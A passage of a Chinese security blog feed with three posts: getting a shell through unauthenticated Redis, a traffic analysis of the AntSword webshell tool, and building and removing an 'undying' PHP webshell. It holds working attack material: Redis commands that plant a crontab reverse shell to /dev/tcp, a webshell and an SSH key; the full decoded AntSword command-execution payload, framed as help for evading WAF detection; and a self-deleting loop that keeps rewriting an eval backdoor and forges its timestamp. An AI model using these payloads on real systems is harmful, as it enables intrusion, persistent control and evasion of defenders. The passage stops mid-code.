设置保存目录</span><br><span class="line">config set dbfilename redis.rdb     # 设置保存文件名</span><br><span class="line">config get dir                      # 查看保存目录</span><br><span class="line">config get dbfilename               # 查看保存文件名</span><br><span class="line">save                                # 进行一次备份操作</span><br><span class="line">flushall                            # 删除所有数据</span><br><span class="line">del key                             # 删除键为key的数据</span><br><span class="line">slaveof ip port                 # 设置主从关系</span><br><span class="line">redis-cli -h ip -p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>Redis-server</p><p>Redis-cli</p><p>简单搭建,redis-sever</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-6.0.0.tar.gz</span><br><span class="line">tar zxvf redis-6.0.0.tar.gz</span><br><span class="line">cd redis-6.0.0/src</span><br><span class="line">make                                                    #编译</span><br><span class="line">cd src</span><br><span class="line">./src/redis-server redis.conf #启动</span><br></pre></td></tr></table></figure><h1 id="Getshell姿势："><a href="#Getshell姿势：" class="headerlink" title="Getshell姿势："></a>Getshell姿势：</h1><p>目前常见的redis未授权的getshell有三种姿势</p><p>1,写计划任务弹shell</p><p>2.写WEBSHELL</p><p>3.写ssh文件修改公私钥</p><p>其实都是基于redis能够去写文件的原理。</p><p>redis写文件步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir 目录</span><br><span class="line">config set dbfilename 文件名</span><br><span class="line">set x &quot;内容&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="1-写计划任务弹shell"><a href="#1-写计划任务弹shell" class="headerlink" title="1,写计划任务弹shell"></a>1,写计划任务弹shell</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>windows的开机任务是这个文件夹，将马写入这个文件，开机都会运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\</span><br></pre></td></tr></table></figure><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>linux的计划任务的功能是crontab,写计划任务前在反弹shell前最好加\n\n\n，末尾也加\n，这样crontab文件里就是分行的，就不会出现bug。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/用户名             /var/spool/cron/$USER 所有用户都可以使用 </span><br><span class="line">/var/spool/cron/crontabs/用户名</span><br><span class="line">/etc/crontab    #/etc/crontab 只有 root 用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行。如：* * * * * root myCommand</span><br><span class="line">/etc/cron.d/xxx  </span><br></pre></td></tr></table></figure><h5 id="写入计划任务"><a href="#写入计划任务" class="headerlink" title="写入计划任务"></a>写入计划任务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>   客户端连接到服务器</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625621025412-04032c26-a86f-4a96-8e2c-0a4871aedf10.png" alt="image.png"></p><p>写计划任务</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625623299661-eaffeb67-0fc0-41c1-aeeb-360807f6be0c.png" alt="image.png"></p><p>成功接受到shell</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625623339951-eea1ab48-5f88-4513-9e71-210d4a6031cc.png" alt="image.png"></p><h3 id="2-写Webshell"><a href="#2-写Webshell" class="headerlink" title="2.写Webshell"></a>2.写Webshell</h3><p>前提条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机redis未授权，在攻击机能用redis clinet连接，并未登录验证</span><br><span class="line">靶机开启web服务，并且知道网站路径，还需要具有文件读写增删改查权限</span><br></pre></td></tr></table></figure><p>操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>在服务器端开启web服务</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625625666665-8250799e-efcf-49af-b0d4-5699b42f7102.png" alt="image.png"></p><p>在客户端连接写webshell</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625625913188-85a5bdc0-a5db-4c4c-b4c3-31be8b5fc354.png" alt="image.png"></p><p>写入成功</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625625941420-36f7d0c7-3234-4cf3-b91f-ff7d5b5a2e59.png" alt="image.png"></p><h3 id="3-写ssh文件修改公私钥"><a href="#3-写ssh文件修改公私钥" class="headerlink" title="3.写ssh文件修改公私钥"></a>3.写ssh文件修改公私钥</h3><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h4><p>1、Redis服务使用ROOT账号启动</p><p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p><p>服务器需要开启ssh，允许远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 更新源</span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"># 安装openssh-server</span><br><span class="line">apt install openssh-server</span><br><span class="line"></span><br><span class="line"># 允许root远程登陆</span><br><span class="line">echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"># SSH开机自启</span><br><span class="line">systemctl enable ssh</span><br><span class="line"></span><br><span class="line"># 开启SSH</span><br><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure><p>服务器需要配置redis.conf关闭redis的保护模式，以及开启外连。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-6.0.0</span><br><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure><p>注释掉bind 127.0.0.1</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625705362933-cd88f3ed-0344-4003-a4d5-37fdc320651b.png" alt="image.png"></p><p>保护模式 修改为no</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625705391948-fda3326a-24ae-46d1-b5aa-c428fc847664.png" alt="image.png"></p><p>最后配置如图</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625705436770-4fbcf4ad-2c58-43ee-bdc2-335d02cd6325.png" alt="image.png"></p><p>然后启动redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><p>在客户端生成公私钥</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625627755949-88d0ea73-f97a-4240-8d90-4feaae9ec52c.png" alt="image.png"></p><p>什么是公钥什么是私钥呢，可以觉得公钥就是锁，私钥就是钥匙。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625706935315-6df9271f-27ee-482a-a97a-91ba574d1a12.png" alt="image.png"></p><p>其中 id.rsa是私钥  id_rsa.pub是公钥。</p><p>然后我们连接redis 写入公钥到服务器，也就是给它换锁。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625707809812-de8696f2-2aab-4f87-81cf-0fe6b5877740.png" alt="image.png"></p><p>ssh连接，没输密码直接成功。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625707841805-9cc0ef3c-8748-4306-95fd-5b0e6e434109.png" alt="image.png"></p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.freebuf.com/articles/web/249238.html">https://www.freebuf.com/articles/web/249238.html</a></p><p><a href="https://paper.seebug.org/1169/">https://paper.seebug.org/1169/</a></p><p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑流量简单分析</title>
      <link href="/2021/05/06/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
      <url>/2021/05/06/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p> 准备好蚁剑（<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a>)</p><p> 设置代理,让流量走抓包工具</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1624966615743-2b90e17c-4cbd-4a80-bab6-2174958d030c.png" alt="image.png"></p><p>准备一个shell和服务器，用来测试。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1624966782779-3c47d8ba-12ce-4588-8a56-a05cc87b248c.png" alt="image.png"></p><p>开启抓包，执行命令。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1624966974891-54da38e3-9b59-458d-8cb7-ab57624cb698.png" alt="image.png"></p><h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h3><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1624967078239-6577ba59-65ac-4096-bc94-4a9cb93af624.png" alt="image.png"></p><p>有四个参数，一个一个开始分析。</p><p>第一个参数M，这是马的密码。也是执行了的代码，进行url解码，格式化，得到以下代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  //这里是我自己加的，可以复制vscode，方便代码查看。</span><br><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir=@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">    $oparr=preg_split(&quot;/\\\\|\//&quot;,$opdir);</span><br><span class="line">    $ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    $tmdir=&quot;.ac7da9b2a2d&quot;;</span><br><span class="line">    @mkdir($tmdir);</span><br><span class="line">    @chdir($tmdir);</span><br><span class="line">    @ini_set(&quot;open_basedir&quot;,&quot;..&quot;);</span><br><span class="line">    for ($i=0;$i&lt;sizeof($oparr);$i++) &#123;</span><br><span class="line">        @chdir(&quot;..&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @ini_set(&quot;open_basedir&quot;,&quot;/&quot;);</span><br><span class="line">    @rmdir($ocwd.&quot;/&quot;.$tmdir);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;93394&quot;.&quot;7a55b4&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;a21&quot;.&quot;8d8c&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $p=base64_decode(substr($_POST[&quot;bb9b95cdba539f&quot;],2));</span><br><span class="line">    $s=base64_decode(substr($_POST[&quot;tb31b6c913c4c8&quot;],2));</span><br><span class="line">    $envstr=@base64_decode(substr($_POST[&quot;g1f6a8df850199&quot;],2));</span><br><span class="line">    $d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    $c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;/c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">    if(substr($d,0,1)==&quot;/&quot;) &#123;</span><br><span class="line">        @putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        @putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($envstr)) &#123;</span><br><span class="line">        $envarr=explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">        foreach($envarr as $v) &#123;</span><br><span class="line">            if (!empty($v)) &#123;</span><br><span class="line">                @putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">    function fe($f) &#123;</span><br><span class="line">        $d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class="line">        if(empty($d)) &#123;</span><br><span class="line">            $d=array();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));</span><br><span class="line">        &#125;</span><br><span class="line">        return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    function runshellshock($d, $c) &#123;</span><br><span class="line">        if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;</span><br><span class="line">            if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class="line">                $tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);</span><br><span class="line">                putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">                if (fe(&#x27;error_log&#x27;)) &#123;</span><br><span class="line">                    error_log(&quot;a&quot;, 1);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return False;</span><br><span class="line">            &#125;</span><br><span class="line">            $output = @file_get_contents($tmp);</span><br><span class="line">            @unlink($tmp);</span><br><span class="line">            if ($output != &quot;&quot;) &#123;</span><br><span class="line">                print($output);</span><br><span class="line">                return True;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return False;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    function runcmd($c) &#123;</span><br><span class="line">        $ret=0;</span><br><span class="line">        $d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">        if(fe(&#x27;system&#x27;)) &#123;</span><br><span class="line">            @system($c,$ret);</span><br><span class="line">        &#125; elseif(fe(&#x27;passthru&#x27;)) &#123;</span><br><span class="line">            @passthru($c,$ret);</span><br><span class="line">        &#125; elseif(fe(&#x27;shell_exec&#x27;)) &#123;</span><br><span class="line">            print(@shell_exec($c));</span><br><span class="line">        &#125; elseif(fe(&#x27;exec&#x27;)) &#123;</span><br><span class="line">            @exec($c,$o,$ret);</span><br><span class="line">            print(join(&quot;</span><br><span class="line">&quot;,$o));</span><br><span class="line">        &#125; elseif(fe(&#x27;popen&#x27;)) &#123;</span><br><span class="line">            $fp=@popen($c,&#x27;r&#x27;);</span><br><span class="line">            while(!@feof($fp)) &#123;</span><br><span class="line">                print(@fgets($fp,2048));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($fp);</span><br><span class="line">        &#125; elseif(fe(&#x27;proc_open&#x27;)) &#123;</span><br><span class="line">            $p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);</span><br><span class="line">            while(!@feof($io[1])) &#123;</span><br><span class="line">                print(@fgets($io[1],2048));</span><br><span class="line">            &#125;</span><br><span class="line">            while(!@feof($io[2])) &#123;</span><br><span class="line">                print(@fgets($io[2],2048));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose($io[1]);</span><br><span class="line">            @fclose($io[2]);</span><br><span class="line">            @proc_close($p);</span><br><span class="line">        &#125; elseif(fe(&#x27;antsystem&#x27;)) &#123;</span><br><span class="line">            @antsystem($c);</span><br><span class="line">        &#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">            return $ret;</span><br><span class="line">        &#125; elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">            $w=new COM(&#x27;WScript.shell&#x27;);</span><br><span class="line">            $e=$w-&gt;exec($c);</span><br><span class="line">            $so=$e-&gt;StdOut();</span><br><span class="line">            $ret.=$so-&gt;ReadAll();</span><br><span class="line">            $se=$e-&gt;StdErr();</span><br><span class="line">            $ret.=$se-&gt;ReadAll();</span><br><span class="line">            print($ret);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ret = 127;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    $ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">    print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>首先找到执行命令的关键函数，跟踪去分析，在第84行，都是一些命令执行的函数：</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625369665616-dd7af324-d396-4bd4-91f2-f791bb32cb02.png" alt="image.png"></p><p>其中fe()函数是去检查有无在disable_functions中</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625369741924-7ff037d0-012c-4d47-8fff-858bd26c7e87.png" alt="image.png"></p><p>跟踪函数runcmd，看看哪里调用了这个函数，在133行：</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625369887171-2f532cbe-beeb-41aa-afe8-0fd10a542ebe.png" alt="image.png"></p><p>传入了$r参数，跟踪$r:</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625369942519-c96e417e-7aa2-45cd-b5f3-c5e271f592e3.png" alt="image.png"></p><p>接着去跟踪$p,$c,在代码的31行:</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625370049389-f67cdade-1fac-40f2-9b82-6c4f4d0b37b3.png" alt="image.png"></p><p>可以看到这里就传递的其他三个参数开始有关了，将$p,$c去掉前面两位，进行url,base64解码：</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625370334581-372b46ab-a8f1-413a-8771-a2373fd0d558.png" alt="image.png"></p><p>$s:</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625371508332-970bed3f-8ef0-48a0-b3d4-15af9918583e.png" alt="image.png"></p><p>$p:</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/1625371610710-026c838e-6a91-4b94-89b8-95aad50b9249.png" alt="image.png"></p><p>大概就是这样的一个调用过程。</p><h2 id="Menge有话"><a href="#Menge有话" class="headerlink" title="Menge有话"></a>Menge有话</h2><p>分析这些有什么用呢，这些就是工具的流量，懂原理，能够进行修改和混淆流量，也就是俗说的”魔改”，在过一些waf的流量识别的时候，通常能够起到很好的作用。</p><p>由于博主代码知识较差，只是简单分析，等代码好点，再来详尽的分析蚁剑、冰蝎、菜刀等webshell工具的流量，以及魔改研究，敬请期待。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> php </tag>
            
            <tag> webshell管理工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不死马的实践和清除</title>
      <link href="/2021/05/05/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%AE%9E%E8%B7%B5%E5%92%8C%E6%B8%85%E9%99%A4/"/>
      <url>/2021/05/05/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%AE%9E%E8%B7%B5%E5%92%8C%E6%B8%85%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="不死马的实践"><a href="#不死马的实践" class="headerlink" title="不死马的实践"></a>不死马的实践</h1><p>不死马，简单来说，就是一直复活的马，杀不死的马。</p><p>不死马的运用场景可以用于攻防对抗，如HW在实际工作中切勿使用，因为清除麻烦，可能会对客户造成影响。</p><p>这是很常见的不死马，下面上传在我服务器下实践一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// 函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行</span><br><span class="line">ignore_user_abort(true); </span><br><span class="line"></span><br><span class="line">// 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制</span><br><span class="line">set_time_limit(0);</span><br><span class="line"></span><br><span class="line">// 删除文件本身，以起到隐蔽自身的作用</span><br><span class="line">unlink(__FILE__);</span><br><span class="line"></span><br><span class="line">$file = &#x27;shell.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line"></span><br><span class="line">      // 以绕过“find –name &#x27;*.php&#x27; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件</span><br><span class="line">    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell.php&#x27;);</span><br><span class="line">    usleep(5000); // 一微秒等于百万分之一秒 2000000 等于 2 秒</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上传后，可以看到目录下有一个shell.php文件</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20210629123347403.png" alt="image-20210629123347403"></p><p>内容就是不死马里的$code</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20210629123303895.png" alt="image-20210629123321358"></p><p>尝试删除这个shell.php</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20210629123321358.png" alt="image-20210629123303895"></p><p>在webshell管理工具中去删掉，发现也是删不掉的，shell一直在线。</p><p><img src="https://menge-bucket.oss-cn-beijing.aliyuncs.com/Note_img/image-20210629123414154.png" alt="image-20210629123414154"></p><h1 id="不死马的解决"><a href="#不死马的解决" class="headerlink" title="不死马的解决"></a>不死马的解决</h1><p>那么究竟要怎么去解决这个不死马呢，它真的不死吗？</p><p>目前我知道的有两种解决方法</p><p>  1.重启服务器 重启服务器是万能的</p><p>  2.kill掉www-date用户的所有子进程</p><p>过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span 